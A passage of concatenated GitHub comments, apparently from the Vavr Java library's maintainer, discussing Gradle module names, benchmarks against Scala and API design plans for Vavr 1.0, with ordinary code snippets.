purpose?\nThis does not work:\n```groovy\n// parent build.gradle\nclass Module {\n    String name\n}\nclass modularity implements Plugin {\n    void apply(Project project) {\n        def extension = project.extensions.create('module', Module)\n    }\n}\nsubprojects {\n    apply plugin: 'java'\n    apply plugin: 'modularity'\nrepositories {\n    jcenter()\n}\n\ngroup = 'io.vavr'\nversion = '1.0.0'\n\ncompileJava {\n    sourceCompatibility = 8\n    targetCompatibility = 8\n    options.encoding = 'UTF-8'\n    options.compilerArgs = [ '-Xlint:all', '-Werror' ]\n}\n\njar {\n    println \"Creating module $module.name\"\n    manifest.attributes(\n            'Automatic-Module-Name': module.name\n    )\n}\n\n}\n```\ngroovy\n// subproject build.gradle\nmodule {\n    name = 'io.vavr.core'\n}\nError: Plugin with id 'modularity' not found.\n. @melix Update: it does work. I needed to remove the quotes apply plugin: modularity\nThx for the hint!. @melix Actually it did not work because the original Gradle module name was taken (I think module was a reserved word`).\nWhen I renamed it to module2, it was not initialized, e.g. module2.name was null. Maybe also an afterEvaluate is needed, even when using a plugin?\n\nI ended up with a more straight-forward solution without extra plugins - I just renamed the Gradle modules of the multi module project.\nbuild.gradle:\n```groovy\nsubprojects {\n    apply plugin: 'java'\nrepositories {\n    jcenter()\n}\n\ngroup = 'io.vavr'\nversion = '1.0.0'\n\ncompileJava {\n    sourceCompatibility = 8\n    targetCompatibility = 8\n    options.encoding = 'UTF-8'\n    options.compilerArgs = [ '-Xlint:all', '-Werror' ]\n}\n\njar {\n    manifest.attributes(\n        'Automatic-Module-Name': module.name\n    )\n}\n\n}\n```\nThe subprojects only define dependencies, no more extra module names are declared.. @melix oh, that's not possible because the maven coordinates changed, too \ud83d\ude48. @melix Sorry for the flood of notifications. I run into more problems.\n\n[x] jar has to depend on jarModule\n[x] the new task jarModule needs to contain a doLast (is that correct? without it, it does not work)\n[ ] I'm not able to add manifest attributes to the outer jar task from within the new plugin\n\n```groovy\nclass JavaModule {\n    String name\n}\nclass modularity implements Plugin {\n    void apply(Project project) {\n        def extension = project.extensions.create('javaModule', JavaModule)\n        project.task('jarModule') {\n            doLast {\n                println \"Automatic-Module-Name: $extension.name\"\n                // FAILS\n                jar {\n                    manifest.attributes(\n                        'Automatic-Module-Name': extension.name\n                    )\n                }\n            }\n        }\n    }\n}\nsubprojects {\n    apply plugin: 'java'\n    apply plugin: modularity\nrepositories {\n    jcenter()\n}\n\ngroup = 'io.vavr'\nversion = '1.0.0'\n\ncompileJava {\n    sourceCompatibility = 8\n    targetCompatibility = 8\n    options.encoding = 'UTF-8'\n    options.compilerArgs = [ '-Xlint:all', '-Werror' ]\n}\n\njar {\n    dependsOn 'jarModule'\n}\n\n}\n```\nSubproject:\ngroovy\njavaModule { name = 'io.vavr.core' }\nError:\n```bash\n$ ./gradlew clean assemble\nExecution failed for task ':vavr-core:jarModule'.\n\nCould not find method jar() for arguments [modularity$_apply_closure1$_closure2$_closure3@410542b4] on task ':vavr-core:jarModule' of type org.gradle.api.DefaultTask.\n```\n\n. @Opalo thanks, let's come back this evening.\n(The subproject name isn't the java module name. Currently we have 'vavr-core' and 'vavr-control' but we need 'io.vavr.core' and 'io.vavr.control'. However, the artifact names need to remain 'vavr-core' and ' vavr-control'.). Thanks, have fun!. @Opalo I reverted the Plugin-related changes and went back to the simplest solution. We gained nothing by adding additional lines of codes and workarounds - the result is the same with the following:\n```groovy\nsubprojects {\napply plugin: 'java'\n\nrepositories {\n    jcenter()\n}\n\ngroup = 'io.vavr'\nversion = '1.0.0'\n\ncompileJava {\n    sourceCompatibility = 8\n    targetCompatibility = 8\n    options.encoding = 'UTF-8'\n    options.compilerArgs = [ '-Xlint:all', '-Werror' ]\n}\n\nafterEvaluate {\n    jar {\n        inputs.property('moduleName', moduleName)\n        manifest.attributes(\n            'Automatic-Module-Name': module.name\n        )\n    }\n}\n\n}\n```\n(+ ext.moduleName definitions in the subproject's build.gradle files).\nSimplicity wins.. @valery1707 thanks, much of work :)\nThe benchmarks show the throughput (thrpt) performance measured in operations per second (ops/s).\nThe greater the score, the better the overall result (-> the container size is inversely\u00a0proportional compared to the throughput).\nWhen looking at the results, I would say that\n\nVavr's List is nearly as fast as Scala's List\nand that Vavr's Vector is blazing-fast compared to Scala's Vector (i.e. 24x faster for container size 2500 and 83x faster for container size 10. Surprisingly Scala is only 2x slower for container size 1000). /cc @paplorinc \nSomtimes the Supplier variant seems to be faster, sometimes it seems to be slower.\n\n\nI will make a review and javadoc corrections tomorrow. Thx!. The performance looks great, thank you for providing the long-running benchmarks!. Thx!. @Raffinate a completely lazy structure would be nice. Before doing a full-blown PR, I would be interested in sketching the main ideas.\nFor a spike we could consider the following methods (without inheritance, signatures may change later):\n```java\ninterface Stream {\n// + factory methods empty(), of(T), continually(T)\n\nboolean isEmpty();\nT head();\nStream<T> tail();\n\n<U> Stream<U> map(Function<T, U> mapper);\n<U> Stream<U> flatMap(Function<T, Stream<U>> mapper);\nStream<T> filter(Predicate<T> predicate);\n\nStream<T> take(int n);\n\nvoid forEach(Consumer<T> action);\n\n}\n```\nGood tests for laziness would be:\n```java\n// should be true\nStream.continually(1).filter(i -> false).take(0).isEmpty();\n// should be true\nStream.continually(1).flatMap(i -> Stream.empty()).take(0).isEmpty();\n```\n. We align to Scala instead of inventing something new. If our behavior differs from that of Scala, it probably might be a bug (and needs to be fixed in another issue). Therefore I will close this ticket.\nI think there might be alternatives that are completely lazy (RxJava?), however these libs probably serve a different purpose than providing 'plain' collections.. Thank you, we will add better documentation for Vavr 1.0. The documentation will get a complete rewrite starting with Vavr 1.. Thank you. I think the best solution would be to re-throw exceptions that have nothing to do with the test. I consider this to be a bug.. @splitcells of course you are right, (unexpected) exceptions need to lead to an Erroneous CheckResult.. For now I will not further invest in vavr-test and keep it as-is because JUnit 5 is the 'defacto standard' and it offers property testing.. @liviamoroianu could you please provide us with a minimal working example? E.g. by hard coding/substituting a minimal version of exception.getValidationResult().getError() that leads to the error you described.. @liviamoroianu I hope you don't mind if I close this issue because of house-keeping. I think the issue is located on the call-site, not within Vavr.\nNevertheless, if you could give us a MWE (see above) I will re-open the issue and fix it.. Yes, it would make sense to add it - PR welcome!. Thank you for your suggestion. I'm afraid, that is not possible because it would raise ambiguities:\n\n(Note: I used Function instead of Function1 because it is a more general API that matches your use-case.)\nI suggest to use a method reference instead:\n```java\n void test() {\nCheckedFunction1<T, R> cf = TODO();\nFunction1<R, V> f = TODO();\n\ncf.andThen(f::apply);\n\n}\n```\nI hope you don't mind if I close this issue.. I don't want to expand the vocabulary of Vavr, i.e. by adding checkedFunction.andThenPure(pureTransformer). In fact I strive for a much simpler Vavr for the next major version. It should be aligned more to native Java, currently we build a parallel world to Java by aligning strictly to Scala.\nTo tell the truth, I think we do not need Function and Tuple at all. There are only a few use-cases within Vavr where we internally apply Function3+ or Tuple3+. Function0, Function1 and Function2 are already part of the JDK. Tuple0 is nothing. Tuple1<T> is T and Tuple2 is used as Map.Entry in our lib (beside zippers). Given that, we effectively only need a pair.\nThe pattern matching API is neat but somehow experimental. Java will ship its own native pattern matching. Given that, we do not need Function and Tuple.\nTake a look at the implementation - it is trivial. Almost all methods are one-liners:\n\nSimplicity means not doing all the things. Vavr 1.0 will be simple.. Hi Chris,\nthank you for your suggestion. May I ask what your use-case is?\nTechnically it would mean applying a function to an argument without applying it :)\nMore specifically, it would mean to fixate the arguments and defer the function call:\n```java\nFunction1 f1 = TODO();\nFunction0 f0_1 = () -> f1.apply(t);\nFunction0 f0_2 = f1.deferred(t);\nFunction3 f3 = TODO();\nFunction0 f0_3 = () -> f3.apply(t1, t2, t3);\nFunction0 f0_4 = f1.deferred(t1, t2, t3);\n```\nI don't think there is a real benefit of introducing a new keyword (let's say deferred) to our internal DSL. The users need to take the hurdle to discover it. FP means using lambdas, which is pretty straight forward. Keep it simple!\nI hope you don't mind if I close this issue.\nThanks again.. @alshain for me perfectly ok to include it in the 0.9 stream. I will update the milestones the next days.\n@nfekete I understand - the only 'problem' I see is that multiple times calling curried will lead to interesting results. Maybe we need a zero abstract method (ZAM) marker interface in order to decide whether to return the identity or a new lambda... I think we need a new issue for the curried() fix. Anyone?\n. @nfekete thanks for creating the issue!\ngood question. now we have three alternate options:\njava\nFunction0<R> pf1 = f.curried().apply(t1);\nFunction0<R> pf2 = () -> f.apply(t1);\nFunction0<R> pf3 = f.deferred(t1);\nPersonally I would use the lambda. For me it is a reflex/good habit to start a Supplier (resp. Function0) with () ->. That is easy to remember.\n. Yes, with #2240 we will have a consistent solution. Thank you for thinking about it!. @nfekete \nCurrying is well-defined:\nGiven a function f: (A x B) -> C, the curried form is defined to be curried(f): A -> (B -> C).\nScala does it this way for Function2:\n\nUnsurprisingly, it is not defined for Function1:\n\n\nWe should remove curried(), tupled() and reversed() from Function0 and Function1. They do nothing at all and exist only for academic reasons.\nHowever, we could keep all as-is in order to stay backward compatible here.\n\nNote: I would not re-open #2239. Using a lambda is easy enough Function0<R> f0 = () -> f1.apply(t);.. Thank you, that is a good solution.. Hi Jarek, thank you for your PR!\nA while ago we decided against a static flatten function (on collections) in favor of the workaround flatMap(t -> t).\nMain reasons:\n\nwe want to keep the amount of static methods small. Most of them exist only because of missing features within Java\u2018s type system\nwe want to keep the API as thin as possible. We decide on a per case basis if ti is worth to add syntactic sugar\n...\n\nThe characteristics of the merge function are very similar to those of flatten, so I will close this PR.\nI hope you understand!. @jarekratajski thank you!. Hi @grimimirg, thank you for using Vavr!\nYes, that is exactly the way how to get multiple adync results in sync!\nAnother possibility would be a flatMap*-map cascade but it is only useful if you don\u2018t want to operate on sequences:\njava\nfuture1.flatMap(v1 ->\n    future2.flatMap(v2 ->\n        future3.map(v3 -> buildYourResult(v1, v2, v3))\n    )\n);\nor if you prefer to create side-effects use onComplete...\nI hope that helps. We will improve our documentation with Vavr 1.0.. @Bill yes, N\u00e1ndor is right, Vavr aligns closely to Scala. There, Iterator is also mutable.. From the viewpoint of the control-flow of an application this is really dirty. \ud83d\udca9\nBut I'm fine with adding it \ud83d\ude05 (consistently to all of our single-valued types, i.e. Try, Option, Either, Validation, Future).\n@rajneeshg0 are you volunteering for a PR?. I think this issue can be closed soon. The io.vavr.control module of Vavr 1.0 unclutters the API surface area and aligns more to Scala (and Java):\n\nPlease note that the Option API will be very similar to Try (but not completely identical.\nPlease note that this is still work in progress.\n. I've aligned the Vavr 1.0 API (of Option, Try and Either) to Scala 2.13-M5 and Java 11.\nWe strive for reducing the API surface area. For now, we will not add additional methods which aren't present in Java or Scala.. Yes, it is work in progress. See #1629. Please use our chat for questions: https://gitter.im/vavr-io/vavr. @ all \nWe aligned to Scala, there Set extends (A) => Boolean:\n\nThe same applies to Seq and Map and Multimap:\n```java\npublic interface Seq extends Traversable, PartialFunction, Serializable {\n}\npublic interface Map extends Traversable>, PartialFunction, Serializable {\n}\npublic interface Multimap extends Traversable>, PartialFunction>, Serializable {\n}\n```\nwhere PartialFunction extends Function1.\n\n@Sir4ur0n \nHowever, the real problem are the Match.Case overloads. In our case the following are interesting:\n```java\n    @GwtIncompatible\n    public static  Case Case(Pattern0 pattern, Function<? super T, ? extends R> f) {\n        Objects.requireNonNull(pattern, \"pattern is null\");\n        Objects.requireNonNull(f, \"f is null\");\n        return new Case0<>(pattern, f);\n    }\n@GwtIncompatible\npublic static <T, R> Case<T, R> Case(Pattern0<T> pattern, Supplier<? extends R> supplier) {\n    Objects.requireNonNull(pattern, \"pattern is null\");\n    Objects.requireNonNull(supplier, \"supplier is null\");\n    return new Case0<>(pattern, ignored -> supplier.get());\n}\n\n@GwtIncompatible\npublic static <T, R> Case<T, R> Case(Pattern0<T> pattern, R retVal) {\n    Objects.requireNonNull(pattern, \"pattern is null\");\n    return new Case0<>(pattern, ignored -> retVal);\n}\n\n```\nIf we comment out Case(Pattern0<T> pattern, Function<? super T, ? extends R> f), your initial code example compiles fine, because Case<T, R> Case(Pattern0<T> pattern, R retVal) is taken.\n\nMethod overloading in combination with inheritance leads to ambiguities. This is a weakness of our current API. We should think about our options to remove these potential ambiguities completely.. I agree, Set as a Function is rarely used.\nHaving Seq, Map and Multimap being PartialFunctions is useful in the sense that they can be used in conjunction with the Traversable.collect(PartialFunction) method. There is no syntactic sugar in order to create PartialFunction instances, they are no FunctionalInterfaces.\nHowever, PartialFunction extends Function (like in Scala). This leads to the same ambiguities we already experienced with Set.\nWe could remove\njava\npublic static <T, R> Case<T, R> Case(Pattern0<T> pattern, R retVal) {\n    Objects.requireNonNull(pattern, \"pattern is null\");\n    return new Case0<>(pattern, ignored -> retVal);\n}\nBut then we wouldn't be able anymore to return constants using pattern matching, your initial example would look like this:\njava\nSet<String> abc = Set(\"abc\");\nSet<String> result = Match(abc).of(\n    Case($(), () => abc)\n);\nor like this:\njava\nSet<String> abc = Set(\"abc\");\nSet<String> result = Match(abc).of(\n    Case($(), set => set) // resp. Function.identity()\n);\nThe question is, which functionality to remove:\n\n[ ] Set extends Function1, Seq/Map/Multimap extends PartialFunction\n[ ] Case(Pattern0<T> pattern, R retVal)\n\n\ud83e\udd14. @nfekete Thank you, that's interesting. If PartialFunction uses Option under the hood, one use-case is missing: We can't ask the PF anymore if it is defined for some input without calculating the output (which may be expensive).\nThe Bit Mapped Trie (BMT) used by Map.get already calculates Option instances. Your new PF is constructed using a method reference, which performs better/has less overhead than a lambda instance. This leads to the benchmark results we observe.\nThe general case would be to have a domain, which is implemented in two independent ways, with PF_old and PF_new. Also both PF_old and PF_new have to be instantiated the same way (lambda vs method reference) to get a comparable benchmark.\n\nNevertheless, because of the uncovered use-case mentioned above I prefer to stay with the Scala-like PF. Also we will keep our Case overloads (there exists a workaround using type-witnesses). We will remove  the {Set, Seq, Map, Multimap} extends [Function|PartialFunction].\nWe could then add conversion methods to cover the missing functionality:\n```java\ninterface Set {\n    Function toFunction();\n}\ninterface Seq {\n    PartialFunction toPartialFunction();\n}\ninterface Map {\n    PartialFunction toPartialFunction();\n}\ninterface Multimap {\n    PartialFunction> toPartialFunction();\n}\n```\nAdditionally Seq and Map have methods withDefault which make the PartialFunctions total. (Interestingly Multimap does not have these methods). We should move (and rename) the withDefault methods to `PartialFunction:\n```java\ninterface PartialFunction extends Function1 {\ndefault Function1<T, R> total(R defaultValue) { ... }\n\ndefault Function1<T, R> total(Function<? super T, ? extends R> defaultFunction) { ... }\n\n}\n```. I\u2019ve also thought much about changes. Where to start (and where to stop?). Why not throw collections away and use eclipse collections instead. Etc...\nThis leads to my decision to keep most of Vavr as-is, including naming and the general contract of aligning to Scala. Otherwise it would be another library.\nI like to do it straight forward and stick to the existing philosophy. There is no true and no false. Only opinions. Changing the philosophy will confuse the users which rely on it.. In this particular case the decision is already made. And with that, aligning to Scala. We mentioned it in the contribution readme and several issues.\nA discussion is good, it helps us understanding the user-needs. However, it is hard to ensure, if the user who comment issues represent the majority of users... \ud83e\udd14. Agreed, we should document basic design principles. Thought, it was already mentioned there.... This makes sense. I agree with 1. and 2. But we should use ofAll instead of allOf to be consistent with our existing naming scheme. I like 'ofAll' because autocompletion and API are side-by-side to 'of' (=> better UX).. Thank you, I will take it into account when modularizing Vavr 1.0. The specific conversion methods will disappear or replaced by a generic conversion method, like\njava\n<C extends Traversable<T>, T> to(Class<C> type)\n. @nfekete yes, nice suggestion! In the case of Traversables Value.collect() is sufficient.\nI had a more general conversion method in mind that also works for the single-valued Value implementation (like Option, Try, ...). Driver is modularization. Once we split modules, the base module io.vavr.core will not depend on collections, controls etc. anymore. Then the specific toOption(), toTry(), etc. methods will disappear.\nHowever, when looking at Value I think, I will remove it completely. Without the conversion methods, there will not be much that remains:\njava\n * Basic operations:\n *\n * <ul>\n * <li>{@link #get()}</li>\n * <li>{@link #getOrElse(Object)}</li>\n * <li>{@link #getOrElse(Supplier)}</li>\n * <li>{@link #getOrElseThrow(Supplier)}</li>\n * <li>{@link #getOrElseTry(CheckedFunction0)}</li>\n * <li>{@link #getOrNull()}</li>\n * <li>{@link #map(Function)}</li>\n * <li>{@link #stringPrefix()}</li>\n * </ul>\n *\n * Equality checks:\n *\n * <ul>\n * <li>{@link #corresponds(Iterable, BiPredicate)}</li>\n * <li>{@link #eq(Object)}</li>\n * </ul>\n *\n * Iterable extensions:\n *\n * <ul>\n * <li>{@link #contains(Object)}</li>\n * <li>{@link #exists(Predicate)}</li>\n * <li>{@link #forAll(Predicate)}</li>\n * <li>{@link #forEach(Consumer)}</li>\n * <li>{@link #iterator()}</li>\n * </ul>\n *\n * Side-effects:\n *\n * <ul>\n * <li>{@link #out(PrintStream)}</li>\n * <li>{@link #out(PrintWriter)}</li>\n * <li>{@link #peek(Consumer)}</li>\n * <li>{@link #stderr()}</li>\n * <li>{@link #stdout()}</li>\n * </ul>\n *\n * Tests:\n *\n * <ul>\n * <li>{@link #isAsync()}</li>\n * <li>{@link #isEmpty()}</li>\n * <li>{@link #isLazy()}</li>\n * <li>{@link #isSingleValued()}</li>\n * </ul>\n\nThe getXxx() methods will be revisited (Vavr vs. Java vs. Scala), removed from the Traversables and moved to Option, Try, ...\nmap-only makes no sense without flatMap, which is not possible in Java. Namely, we are not able to abstract over Monads towards For-Comprehensions. In Java we have to implement it for each type separately (using method overloads). See API.For, #1629, #2216\nstringPrefix() is (more or less) the same as getClass().getSimpleName(). I will remove it from Vavr 1.0.\nEquality checks corresponds and eq were a mistake. We don't need yet another notion for equality in Java. With the upcoming native Java value types we will get deep quality.\nwe don't really need Iterable extensions for single-valued types. There are workarounds. Some methods might be moved to Traversable. Most Vavr types will extend Iterable directly.\nAll side-effects (but peek()) will be removed. These are basically console outputs.\nThe tests are not needed IMO. Characteristics should be made explicit by using the according types, i.e. Iterator or Stream for the lazy case, Future for the async case, etc. Of course isEmpty() is still needed.\n\n\nRegarding the conversion method for single-valued types, we need 'another layer of indirection' in order to make types convertible. More specifically, we need to be able to access the state of a monad somehow.\nExamples:\n| this | to | result |\n| --- | --- | --- |\n| Some(t) | Try | Success(t) |\n| None | Try | Failure(NoSuchElementException) |\n| Some(t) | Future | Future(Success(t)) |\n| None | Future | Future(Failure(NoSuchElementException)) |\n| Some(t) | Either | Right(t) |\n| None | Either | Left(Void) ? |\n| Some(t) | Validation | Valid(t) |\n| None | Validation | Invalid(Void) ? |\nWe need also convert Try, Future, Either and Validation to all other types.\nAll these types have in common that they have dual states and all operations are biased to one of the states. We could solve the conversion issue by adding an interface Convertible<T, U> that is able to check the state and pull out one of the two values (according to the state).\nWhat we need is a type constructor. We could build one the following way:\n```java\npublic interface Try extends Convertible {\nstatic <T, U> Try<T> cons(Convertible<T, U> convertible) {\n    if (convertible instanceof Try) {\n        return (Try<T>) convertible;\n    } else {\n        return convertible.isDefined() ? Try.success(convertible.get()) : Try.failure(new NoSuchElementException());\n    }\n}\n\n}\n```\nHowever, we would not be able to preserve specific state, like an exception when we convert an Either to a Try.\nBut maybe we don't need these conversions at all. Maybe we should convert in a first step\n\nOption <-> Try\nEither <-> Validation\n\n...and that's it.. We align to Scala. Additionally to Java's collect(Collector), our collections will also have the toXxx() methods.\nWhen redesigning Iterator for 1.0, we will align to Scala...\n```scala\nscala> val i: Iterator[Int] = Set(1, 2, 3).iterator\ni: Iterator[Int] = \nscala> i.toList\nres1: List[Int] = List(1, 2, 3)\nscala> i.toSeq\nres2: Seq[Int] = List()\n```\n. Many thanks! I'm in holidays, too :) Have fun!. Hi @agrison,\nyes, I understand the need of releasing some of the new features.\nI think it makes sense to release a 0.9.3 or 0.10.0 before 1.0.0 happens (which will still take some time).\nBtw - 1.0.0 will be Java 8 compatible :) JDK 11 makes no sense for us, most users are still on JDK 8.. It isn't practicable to create type hierarchies of functional interfaces. In fact, it leads to ambiguities.\nInheritance does not scale very well, it is better to compose things (as you already stated). An example is #2249. Currently I work on removing Function1 and PartialFunction from the type hierarchy of Seq, Set, Map and MultiMap. They will get methods like asFunction, asPartialFunction or asPredicate.\nAlso we prefer traversable.filter(set::contains), which is concise and descriptive. I.e. it hides no internal implementation, like traversable.filter(set), in the case Set implements Predicate.. I will close this issue because we already addressed this topic and work on it in #2249.. Hi @skestle, instead of widening the API I strive for simplifying it.\nWe should remove the constant function in favor of using the existing\njava\ninterface Function1<T1, R> {\n    static <T1, R> Function1<T1, R> of(Function1<T1, R> methodReference) {\n        return methodReference;\n    }\n}\nThen the use-cases can be implemented like this:\n```java\n// = Function1.constant(1)\nFunction1.of(ignored -> 1);\n// = Function1.suppliedWith(() -> 1)\nFunction1.of(ignored -> 1);\n```\nI will create an issue.. Hi @chantrybjss,\nthank you, that is one of the most controversial discussed topics regarding Vavr.\nVavr was originally designed to bring some of the Scala goodness to the Java world, including Option\u2019s semantics. Today, after developing Vavr for more than 4 years, I would handle things a little different.\nIn the first place, a library that extends an existing language, must not duplicate features, especially when using different semantics (like Vavr does with Option).\nSecond, similar features, like Try, Either, ..., should align to existing native API\u2019s (like Optional\u2019s) in order to not confuse developers.\nI already thought about changing Vavr by completely removing Option and align the Try API to the one of Optional. What would we loose?\nThe main features of Vavr\u2019s Option are\n\nit is iterable\nit is serializable\nit is convertible within the Vavr space\n\nConvertability currently does not scale very well because of tight coupling. This is a solvable problem.\nI give nothing about so-called serializability. Sending objects through a wire can be achieved without extending Serializable.\nThe most important aspect (of all Vavr values) is that they are iterable. It enables us to compose things in a gereric way.\n\u2014-\nWhat is your main reason to use Vavr\u2019s Option. Could you also use Optional? What hinders you/what would it take to increase interoperability between Vavr and Java\u2019s Optional?\nThx!. Some features that are possible because of our Option implementation:\n\nOur Map supports null keys and values. I.e. map.get(k) may return Some(null) if the k is associated with null, and None if no value is associated with k.\nSymmetrie: option.toTry().toOption() = option (works for both, Some and None)\n\nThat's how things should work. My experience is that other interpretations are eligible but not canonical.. Thanks for the suggestion.\nCheckReturnValue isn't part of native Java. We do not add any 3rd party dependencies to our library (even if they are seen as some kind of pseudo-standard).\nSo I have to close this issue.\n. We already discussed the use of annotations in Vavr.. @talios this is a general Java problem I do not want to solve. Especially I want to get rid of non-native  annotations.\nThis reminds me of removing the @GuardedBy annotation I introduced in Vavr for internal documentation of concurrency.. Thank you, I missed that, too :). Thanks for reporting!\n\nOf course, Scala behaves correct:\n```scala\nscala> (Integer.MAX_VALUE to 1 by -1).take(3).mkString(\", \")\nres0: String = 2147483647, 2147483646, 2147483645\nscala> (Integer.MAX_VALUE until 1 by -1).take(3).mkString(\", \")\nres1: String = 2147483647, 2147483646, 2147483645\n```\n. @agebhar1 yes, please!. Nice one! We know this error for a long time now and weren't able to fix it. Could you create a PR, please?. @agebhar1 Great, thx!\nI prefer to install it during the CI build. We need to add some lines to the .travis.yml:\nyml\ncache:\n  directories:\n  - \"$HOME/.m2/repository\"\n  - \"$HOME/apache-maven-3.5.3\"\nbefore_install:\n- export M2_HOME=$HOME/apache-maven-3.5.3\n- if [ ! -d $M2_HOME/bin ]; then curl https://archive.apache.org/dist/maven/maven-3/3.5.3/binaries/apache-maven-3.5.3-bin.tar.gz | tar zxf - -C $HOME; fi\n- export PATH=$M2_HOME/bin:$PATH\n(see also \nhttps://gist.github.com/ppatierno/a50396b19c83554fe5f43a71c12c70c6#gistcomment-2094265)\n(this can be removed again when travis-ci solves the issue you mentioned). Many thanks!. Awesome, looks great!\nThank you. I think it will be worse.\nPlease elaborate a bit on your thoughts.. The core implementation is < 400 LOC (including javadoc). All other functionality is built on top of that in a purely functional way, using composition. Given that, the surface for implementation errors is kept really narrow.\nCompared to that, the CompletableFuture implementation looks like a big mess. See https://github.com/frohoff/jdk8u-jdk/blob/master/src/share/classes/java/util/concurrent/CompletableFuture.java\nHowever, these are only internals. The main reason for implementing our own future is that we strive for being better than Java. When using a wrapper, we would be worse by definition.\nI will close this issue. If we decided that our Future is should be exchanged (for any reason), I would think about removing it completely.. (sporadic jdk 9 build error...). addVector is a function, but we pattern match values. Could you please give a concrete example, using Vavr?\nFor examples, take a look at our documentation or our unit tests.\nAdditionally, it is possible to create Match Patterns using the compile-time annotations of the library vavr-match, utilizing an annotation processor. We do that here for example.. Please go to our chat on questions. Our Vavr community will be happy to answer quickly.. Thanks! This looks great for now.\nI will increase the pace a bit and merge it. Then I'm able to go on with my Vavr 1.0 tasks.\nWe will add more/change the For comprehensions later, if necessary.\nFor now I also have no better solution to abstract over the overloaded methods in order to reduce the method amount.\nWe would need a common Monadic interface that is implemented by our 'sealed' classes (like Option, Try, List, ...). This type has to be a recursive self-type, like:\n```java\ninterface Monadic, T> {\n<U> Monadic<M, U> flatMap(Function<? super T, ? extends Monadic<? extends M, ? extends U>> mapper);\n\n<U> Monadic<M, U> map(Function<? super T, ? extends U> mapper);\n\n}\n```\nI will remove the common Value interface, because it does not work well in conjunction with checked functions. E.g. Option will have flatMap(Function), Try will have flatMap(CheckedFunction).\nGiven that, we would also need a CheckedMonadic interface:\n```java\ninterface CheckedMonadic, T> {\n<U> CheckedMonadic<M, U> flatMap(CheckedFunction<? super T, ? extends CheckedMonadic<? extends M, ? extends U>> mapper);\n\n<U> CheckedMonadic<M, U> map(CheckedFunction<? super T, ? extends U> mapper);\n\n}\n```\nUsing the above interfaces, we could reduce the overall amount of For methods to (Monadic, CheckedMonadic) x (1..8) = 16 classes. This amount will stay constants when supporting more types, like Either, Future, Stream, ...\nHowever, the flatMap API will be uglified regarding the sketched solution because the mapper requires a recursive self-type (e.g. CheckedMonadic<Try<?>, U>) instead of a concrete type Try<U>. In turn, the return types of map and flatMap could be overloaded with concrete types.\nI will defer the decision a bit if we use recursive self-types for map and flatMap (but I think, it is the right solution and it will open a whole new space for creating new APIs/better functionality).\n\nThe name could be also FlatMappable instead of Monadic.\nA blocker is the fact that Traversable has\n<U> Traversable<U> flatMap(Function<T, Iterable<U>> mapper)\nwith emphasis on Iterable. This isn't possible using a Monadic interface like shown above.\n\nUpdate: The above isn't really a blocker. Traversable just would extends none of the interfaces Monadic and CheckedMonadic. Instead we add 8 additional For overloads to Vavr's API.\n```java\ninterface Traversable {\n<U> Traversable<U> flatMap(Function<? super T, ? extends Iterable<? extends U>> mapper);\n\n<U> Traversable<U> map(Function<? super T, ? extends U> mapper);\n\n}\n```\n. Thx! I will take a look this evening where to go next! \ud83d\ude0a. Hi @CauchyPeano,\nI've spend some time investing the 'catamorphism' space a bit and added a Monadic interface as described above. I don't want to push Vavr in that direction. It would add an API that opens Vavr in a way that allows us to write algebraic APIs. For example we could expand the algebraic surfance by adding Monoids, Functors, etc.\nIt is not a goal of Vavr to let user know about the existence of such abstractions. Not only that the API gets uglified (by requiring instances of Monadic<M, T> instead of M<T>), but also because we currently need it only for our For-comprehensions. Those are part of a separate module that gets obsolete if Java language architects decide to add a similar feature. Additionally we have the fallback solution of adding manifold overloads.\nJava is not the right language for purely functional programming.\n\nI think for now, the support for Try, Option, List and Future is sufficient. I will close the original issue.. @CauchyPeano I will wait with pulling this until we merged #2281 (in order to prevent merge conflicts regarding your branch).. I think the function memoization re-implementation saved us 1-2 minutes build time. That's round about 5-10% build time.. Guten Morgen Sonnenschein :)\n. I see no difference to zipWithIndex() other than swapped tuple elements.\nWe want to keep the API surface of Vavr narrow (but \u2018deep\u2019). Please use existing functionality, e.g.\njava\nzipWithIndex().map(Tuple2::swap)\n(maybe in conjunction with iterator())\nor\njava\nzipWithIndex((elem, idx) -> Tuple.of(idx, elem))\nor\njava\nzipWith(Iterator.from(0), (elem, idx) -> Tuple.of(elem, idx))\nAdding another method for the same purpose does not scale well in this case. I will close the issue.\nThx for your thoughts!\n. Thanks for the suggestion. In Javaslang there were Kind1 and Kind2 for that purpose. But they had several caveats and I removed them. I was invited as an admin for \nhttps://github.com/KindedJ/KindedJ, a library that wants to provide standard HKT interfaces for Java but I decided not to pollute Vavr\u2019s API with this kind of abstractions.\nSimply spoken, it isn\u2019t currently possible in Java to implement higher-kinded types that work across deep type hierarchies. As a responsible library designer, I can\u2019t add such a non-working feature into Vavr\u2019s code base.\nAnother reason is my strategic decision to keep algebraic / math related API out of Vavr. Our functionality is inherently algebraic. I don\u2019t see the necessity to move to a non-existing audience that does purely functional programming in Java using algebraic abstractions.\n. Hi, this is generally a good idea. In fact I would favor toEither(Function) over toEither() in order to keep the API surface area small.\nHowever, when having fine-grained Java modules, a direct conversion method on the Try type isn\u2018t possible anymore. Try wouldn\u2018t know Either. It might happen that these conversion methods will be moved to API, e.g.\n```java\nimport static io.vavr.api.*;\ntoEither(myTry, mapError);\n```\nThat would be the price of fine-grained modularization.\nHowever, I\u2018m still thinking about putting Either, Try and Option into the same module. Then your suggestion would be possible. Maybe that is the better choice.. @jlorenzen Please hold your horses. I\u2018m currently setting up the first version of vavr-control-1.0. I will add the conversion methods today.\n\nYeah I'm not sure of the overall direction for vavr 1.x.\n\nI\u2018m sure you will be satisfied. The conversion methods will not go to API.... @sclassen wrt semantic versioning, additional features would be released in a 0.10 instead (which isn\u2018t planned currently). 0.9 will receive fixes only.. Vavr 1.0.0 contains a final set of conversion methods. See master branch. A vavr-collection-1.0.0-alpha-1 will be released soon.. I see no problem with Vavr 0.9.2. Here is my test case (aligned to yours but simplified):\n```java\npackage io.vavr;\nimport java.util.function.Function;\nimport static io.vavr.API.*;\npublic class Test {\nenum FlowStepKind {\n    ALERT, EMOJI, OTHER\n}\n\npublic static void main(String[] args) {\n\n    final Function<FlowStepKind, String> formatter = flowStepKind -> Match(flowStepKind).of(\n            Case($(FlowStepKind.EMOJI), \"emoji\"),\n            Case($(), flowStepKind.name())\n    );\n\n    // = \"expected: emoji, actual: emoji\"\n    println(\"expected: emoji, actual: \" + formatter.apply(FlowStepKind.EMOJI));\n\n    // = \"expected: ALERT, actual: ALERT\"\n    println(\"expected: ALERT, actual: \" + formatter.apply(FlowStepKind.ALERT));\n\n    // = \"expected: OTHER, actual: OTHER\"\n    println(\"expected: OTHER, actual: \" + 